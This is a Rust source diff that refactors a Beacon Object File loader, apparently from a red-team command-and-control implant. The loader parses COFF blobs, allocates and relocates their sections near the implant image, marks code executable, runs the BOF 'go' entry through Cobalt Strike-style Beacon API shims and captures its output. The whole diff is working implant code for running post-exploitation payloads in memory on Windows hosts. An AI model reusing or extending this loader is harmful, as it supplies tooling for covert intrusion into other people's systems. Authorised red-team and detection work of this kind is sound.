@@ -226,43 +226,10 @@ unsafe fn format_into(fmt: &[u8], va: &VaArgs) {
             break;
         }
         match fmt[i] {
-            b's' => {
-                if ai < args.len() {
-                    let p = args[ai] as *const u8;
-                    if !p.is_null() {
-                        let mut len = 0usize;
-                        while *p.add(len) != 0 && len < 4096 {
-                            len += 1;
-                        }
-                        out_push(core::slice::from_raw_parts(p, len));
-                    }
-                    ai += 1;
-                }
-            }
-            b'd' | b'i' => {
-                if ai < args.len() {
-                    let v = args[ai] as i32;
-                    let mut buf = [0u8; 12];
-                    let s = itoa(v, &mut buf);
-                    out_push(s.as_bytes());
-                    ai += 1;
-                }
-            }
-            b'x' => {
-                if ai < args.len() {
-                    let v = args[ai] as u32;
-                    let mut buf = [0u8; 9];
-                    let s = utohex(v, &mut buf);
-                    out_push(s.as_bytes());
-                    ai += 1;
-                }
-            }
-            b'c' => {
-                if ai < args.len() {
-                    out_push(&[args[ai] as u8]);
-                    ai += 1;
-                }
-            }
+            b's' => format_push_str(args, &mut ai),
+            b'd' | b'i' => format_push_int(args, &mut ai),
+            b'x' => format_push_hex(args, &mut ai),
+            b'c' => format_push_char(args, &mut ai),
             b'%' => out_push(b"%"),
             other => {
                 // Unknown specifier: emit literally so the output is debuggable.
@@ -270,6 +237,51 @@ unsafe fn format_into(fmt: &[u8], va: &VaArgs) {
             }
         }
         i += 1;
+    }
+}
+
+/// `%s`: push a NUL-terminated string arg (bounded 4096 bytes).
+unsafe fn format_push_str(args: [u64; 6], ai: &mut usize) {
+    if *ai < args.len() {
+        let p = args[*ai] as *const u8;
+        if !p.is_null() {
+            let mut len = 0usize;
+            while *p.add(len) != 0 && len < 4096 {
+                len += 1;
+            }
+            out_push(core::slice::from_raw_parts(p, len));
+        }
+        *ai += 1;
+    }
+}
+
+/// `%d` / `%i`: push a signed-decimal arg.
+unsafe fn format_push_int(args: [u64; 6], ai: &mut usize) {
+    if *ai < args.len() {
+        let v = args[*ai] as i32;
+        let mut buf = [0u8; 12];
+        let s = itoa(v, &mut buf);
+        out_push(s.as_bytes());
+        *ai += 1;
+    }
+}
+
+/// `%x`: push a lowercase-hex arg.
+unsafe fn format_push_hex(args: [u64; 6], ai: &mut usize) {
+    if *ai < args.len() {
+        let v = args[*ai] as u32;
+        let mut buf = [0u8; 9];
+        let s = utohex(v, &mut buf);
+        out_push(s.as_bytes());
+        *ai += 1;
+    }
+}
+
+/// `%c`: push a single-char arg.
+unsafe fn format_push_char(args: [u64; 6], ai: &mut usize) {
+    if *ai < args.len() {
+        out_push(&[args[*ai] as u8]);
+        *ai += 1;
     }
 }
 
@@ -946,8 +958,51 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
     // always `go` per the CS ABI. (Future: allow a custom entry.)
     let _ = name;
 
-    let coff = match parse(blob) {
+    let coff = match run_parse(blob) {
         Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let (alloc, protect, free) = match unsafe { run_resolve_api() } {
+        Ok(f) => f,
+        Err(e) => return e,
+    };
+    let mut guard = run_new_guard(&coff, free, protect);
+    let anchor = run_anchor();
+
+    let sections = unsafe { run_alloc_sections(alloc, anchor, &coff, &mut guard) };
+    let (bases, sizes, is_code) = match sections {
+        Ok(v) => v,
+        Err(e) => return e,
+    };
+
+    let defined = run_map_symbols(&coff, &bases);
+
+    if let Err(e) = unsafe { run_relocate(&coff, &bases, &defined) } {
+        return e;
+    }
+
+    if let Err(e) = unsafe { run_flip_rx(protect, &bases, &sizes, &is_code, &mut guard) } {
+        return e;
+    }
+
+    let entry_addr = match run_entry_addr(&coff, &bases) {
+        Ok(a) => a,
+        Err(e) => return e,
+    };
+
+    let resp = unsafe { run_call_capture(args, entry_addr, &bases) };
+    // `guard` drops here: every section region is zeroed (RX flipped back to RW
+    // first) then released with VirtualFree(MEM_RELEASE). Best-effort on a
+    // missing RtlZeroMemory/VirtualProtect export (diag mark + still free).
+    drop(guard);
+    resp
+}
+
+/// Stage 1: parse the COFF blob; map CoffError into a coarse Response::Err.
+fn run_parse<'a>(blob: &'a [u8]) -> Result<nyx_coff::Coff<'a>, Response> {
+    match parse(blob) {
+        Ok(c) => Ok(c),
         Err(e) => {
             let mut m = String::from("bof parse: ");
             // Append a coarse diagnostic (no alloc::format! in no_std lean builds).
@@ -955,17 +1010,20 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
                 nyx_coff::CoffError::Truncated => "truncated",
                 nyx_coff::CoffError::UnsupportedMachine(_) => "bad machine",
             });
-            return Response::Err(m);
+            Err(Response::Err(m))
         }
-    };
+    }
+}
 
+/// Stage 2a: resolve VirtualAlloc/VirtualProtect/VirtualFree.
+unsafe fn run_resolve_api() -> Result<(VirtualAllocFn, VirtualProtectFn, VirtualFreeFn), Response> {
     let alloc = match unsafe { virtual_alloc() } {
         Some(f) => f,
-        None => return Response::Err(String::from("VirtualAlloc unresolved")),
+        None => return Err(Response::Err(String::from("VirtualAlloc unresolved"))),
     };
     let protect = match unsafe { virtual_protect() } {
         Some(f) => f,
-        None => return Response::Err(String::from("VirtualProtect unresolved")),
+        None => return Err(Response::Err(String::from("VirtualProtect unresolved"))),
     };
     // VirtualFree is the cleanup counterpart of VirtualAlloc — used by the
     // SectionGuard to release every section region when `run` returns. The
@@ -973,9 +1031,13 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
     // export resolution fails every region pushed so far is freed.
     let free = match unsafe { virtual_free() } {
         Some(f) => f,
-        None => return Response::Err(String::from("VirtualFree unresolved")),
+        None => return Err(Response::Err(String::from("VirtualFree unresolved"))),
     };
+    Ok((alloc, protect, free))
+}
 
+/// Stage 2b: build the RAII owner of every VirtualAlloc'd section region.
+fn run_new_guard(coff: &nyx_coff::Coff<'_>, free: VirtualFreeFn, protect: VirtualProtectFn) -> SectionGuard {
     // RAII owner of every VirtualAlloc'd section region. Its Drop zeroes each
     // region (RX flipped back to RW first) then releases it with
     // VirtualFree(MEM_RELEASE) — this is the leak fix: previously every BOF
@@ -984,12 +1046,15 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
     // each is pushed until the function returns (any path). `bases`/`sizes`
     // still mirror what the guard tracks, for the existing symbol/reloc/entry
     // lookups below.
-    let mut guard = SectionGuard {
+    SectionGuard {
         sections: Vec::with_capacity(coff.sections.len()),
         free,
         protect,
-    };
+    }
+}
 
+/// Stage 2c: probe a hint address near the implant image for the section alloc.
+fn run_anchor() -> usize {
     // Anchor near the implant image so REL32 calls from BOF .text to the
     // Beacon-API shims (in the implant image) span < 2 GiB. Without this,
     // VirtualAlloc(NULL,...) can place the BOF 100+ TB from the implant and
@@ -997,8 +1062,16 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
     // the call jumps to garbage → segfault. We probe a hint address derived
     // from a local function's address (a stand-in for the image base), walking
     // downward in 1 MiB steps until VirtualAlloc grants a region.
-    let anchor = beacon_api_addr("BeaconPrintf").unwrap_or(0x10000) as usize;
+    beacon_api_addr("BeaconPrintf").unwrap_or(0x10000) as usize
+}
 
+/// Stage 2d: allocate each section as its own RW region and copy raw bytes.
+unsafe fn run_alloc_sections(
+    alloc: VirtualAllocFn,
+    anchor: usize,
+    coff: &nyx_coff::Coff<'_>,
+    guard: &mut SectionGuard,
+) -> Result<(Vec<u64>, Vec<usize>, Vec<bool>), Response> {
     // 1. Allocate each section as its own RW region; copy raw bytes.
     let mut bases: Vec<u64> = Vec::with_capacity(coff.sections.len());
     let mut sizes: Vec<usize> = Vec::with_capacity(coff.sections.len());
@@ -1007,7 +1080,7 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
         let sz = page((s.virtual_size.max(s.raw.len() as u32)) as usize).max(PAGE_SIZE);
         let base = unsafe { alloc_near(alloc, anchor, sz) };
         if base.is_null() {
-            return Response::Err(String::from("VirtualAlloc failed"));
+            return Err(Response::Err(String::from("VirtualAlloc failed")));
         }
         let addr = base as u64;
         if !s.raw.is_empty() {
@@ -1026,7 +1099,11 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
             is_rx: false,
         });
     }
+    Ok((bases, sizes, is_code))
+}
 
+/// Stage 3a: map defined symbols → absolute addresses (section_base + value).
+fn run_map_symbols(coff: &nyx_coff::Coff<'_>, bases: &[u64]) -> Vec<(String, u64)> {
     // 2. Map defined symbols → absolute addresses (section_base + value).
     let mut defined: Vec<(String, u64)> = Vec::with_capacity(coff.symbols.len());
     for sym in &coff.symbols {
@@ -1035,14 +1112,22 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
             defined.push((sym.name.clone(), addr));
         }
     }
+    defined
+}
 
+/// Stage 3b: apply relocations (memory is still RW here).
+unsafe fn run_relocate(
+    coff: &nyx_coff::Coff<'_>,
+    bases: &[u64],
+    defined: &[(String, u64)],
+) -> Result<(), Response> {
     // 3. Apply relocations (memory is still RW here).
-    let resolver = BofResolver { defined: &defined };
+    let resolver = BofResolver { defined };
     for (i, s) in coff.sections.iter().enumerate() {
         if s.relocations.is_empty() {
             continue;
         }
-        let patched = match apply(s, &coff, bases[i], &resolver) {
+        let patched = match apply(s, coff, bases[i], &resolver) {
             Ok(p) => p,
             Err(e) => {
                 let mut m = String::from("bof reloc `");
@@ -1055,14 +1140,24 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
                     nyx_coff::ApplyError::UnsupportedReloc(_) => "unsupported reloc type",
                     nyx_coff::ApplyError::RelocOverflow => "reloc displacement out of i32 range",
                 });
-                return Response::Err(m);
+                return Err(Response::Err(m));
             }
         };
         unsafe {
             ptr::copy_nonoverlapping(patched.as_ptr(), bases[i] as *mut u8, patched.len());
         }
     }
+    Ok(())
+}
 
+/// Stage 4: flip code sections to RX (W^X: close the write window).
+unsafe fn run_flip_rx(
+    protect: VirtualProtectFn,
+    bases: &[u64],
+    sizes: &[usize],
+    is_code: &[bool],
+    guard: &mut SectionGuard,
+) -> Result<(), Response> {
     // 4. Flip code sections to RX (W^X: close the write window). Also record
     //    is_rx in the guard so Drop flips them back to RW before zeroing.
     for i in 0..bases.len() {
@@ -1077,59 +1172,73 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
                 )
             } == 0
             {
-                return Response::Err(String::from("VirtualProtect -> RX failed"));
+                return Err(Response::Err(String::from("VirtualProtect -> RX failed")));
             }
             guard.sections[i].is_rx = true;
         }
     }
+    Ok(())
+}
 
+/// Stage 5: resolve the BOF entry symbol `go`.
+fn run_entry_addr(coff: &nyx_coff::Coff<'_>, bases: &[u64]) -> Result<u64, Response> {
     // 5. Resolve the entry symbol `go`.
     let entry_sym = match coff.symbols.iter().find(|s| s.name == "go") {
         Some(s) => s,
-        None => return Response::Err(String::from("BOF entry symbol `go` not found")),
+        None => return Err(Response::Err(String::from("BOF entry symbol `go` not found"))),
     };
     if entry_sym.section_number < 1 {
-        return Response::Err(String::from("BOF entry `go` is external/undefined"));
+        return Err(Response::Err(String::from("BOF entry `go` is external/undefined")));
     }
-    let entry_addr = bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64;
+    Ok(bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64)
+}
 
+/// Stage 6a: fixture trace for the selftest build (compiled out in prod).
+#[cfg(feature = "selftest")]
+unsafe fn run_selftest_trace(entry_addr: u64, bases: &[u64]) {
+    let n = bases.len().min(4);
+    TRACE_NUMS[0] = bases.len() as u64;
+    for i in 0..n {
+        TRACE_NUMS[1 + i] = bases[i];
+    }
+    TRACE_NUMS[5] = entry_addr;
+    TRACE_NUMS[6] = beacon_api_addr("BeaconPrintf").unwrap_or(0);
+    let mut status: u64 = 0;
+    let e = entry_addr as *const u8;
+    // Fixture layout (bof_print.o): lea disp32 at +0x11, call disp32 at
+    // +0x1e. Every raw read is gated on a VirtualQuery readability probe
+    // so a broken relocation degrades to status bits instead of an AV.
+    if vq_readable(e as usize, 0x30) {
+        status |= 1;
+        ptr::copy_nonoverlapping(e, TRACE_BYTES.as_mut_ptr(), 16);
+        ptr::copy_nonoverlapping(e.add(0x11), TRACE_BYTES.as_mut_ptr().add(16), 4);
+        ptr::copy_nonoverlapping(e.add(0x1e), TRACE_BYTES.as_mut_ptr().add(20), 4);
+        let disp = (e.add(0x11) as *const i32).read_unaligned() as i64;
+        let tgt = (entry_addr + 0x15).wrapping_add(disp as u64);
+        TRACE_NUMS[7] = tgt;
+        if vq_readable(tgt as usize, 8) {
+            status |= 2;
+            ptr::copy_nonoverlapping(tgt as *const u8, TRACE_BYTES.as_mut_ptr().add(24), 8);
+        }
+    }
+    // status rides in the high dword of TRACE_NUMS[0]:
+    // bit32 = entry 16B readable, bit33 = lea target readable.
+    TRACE_NUMS[0] |= status << 32;
+}
+
+/// Stage 6b: pack args, run the selftest trace, call `go`, capture output,
+/// then drop the section guard (zero + free every region).
+unsafe fn run_call_capture(args: &[String], entry_addr: u64, _bases: &[u64]) -> Response {
     // 6. Set up capture + args, call go(), capture output. The SectionGuard is
     //    dropped when `run` returns (here or at any error above), so the section
     //    regions are zeroed + freed AFTER go() has returned — by which point no
     //    Beacon-API shim holds a live pointer into them.
     #[cfg(feature = "selftest")]
     unsafe {
-        let n = bases.len().min(4);
-        TRACE_NUMS[0] = bases.len() as u64;
-        for i in 0..n {
-            TRACE_NUMS[1 + i] = bases[i];
-        }
-        TRACE_NUMS[5] = entry_addr;
-        TRACE_NUMS[6] = beacon_api_addr("BeaconPrintf").unwrap_or(0);
-        let mut status: u64 = 0;
-        let e = entry_addr as *const u8;
-        // Fixture layout (bof_print.o): lea disp32 at +0x11, call disp32 at
-        // +0x1e. Every raw read is gated on a VirtualQuery readability probe
-        // so a broken relocation degrades to status bits instead of an AV.
-        if vq_readable(e as usize, 0x30) {
-            status |= 1;
-            ptr::copy_nonoverlapping(e, TRACE_BYTES.as_mut_ptr(), 16);
-            ptr::copy_nonoverlapping(e.add(0x11), TRACE_BYTES.as_mut_ptr().add(16), 4);
-            ptr::copy_nonoverlapping(e.add(0x1e), TRACE_BYTES.as_mut_ptr().add(20), 4);
-            let disp = (e.add(0x11) as *const i32).read_unaligned() as i64;
-            let tgt = (entry_addr + 0x15).wrapping_add(disp as u64);
-            TRACE_NUMS[7] = tgt;
-            if vq_readable(tgt as usize, 8) {
-                status |= 2;
-                ptr::copy_nonoverlapping(tgt as *const u8, TRACE_BYTES.as_mut_ptr().add(24), 8);
-            }
-        }
-        // status rides in the high dword of TRACE_NUMS[0]:
-        // bit32 = entry 16B readable, bit33 = lea target readable.
-        TRACE_NUMS[0] |= status << 32;
+        run_selftest_trace(entry_addr, _bases);
     }
     let args_blob = pack_args(args);
-    let resp = unsafe {
+    unsafe {
         reset_capture();
         if !args_blob.is_empty() {
             ARGS_PTR = args_blob.as_ptr();
@@ -1146,10 +1255,5 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
         }
         let out = captured_output().to_vec();
         Response::BofOutput(out)
-    };
-    // `guard` drops here: every section region is zeroed (RX flipped back to RW
-    // first) then released with VirtualFree(MEM_RELEASE). Best-effort on a
-    // missing RtlZeroMemory/VirtualProtect export (diag mark + still free).
-    drop(guard);
-    resp
+    }
 }
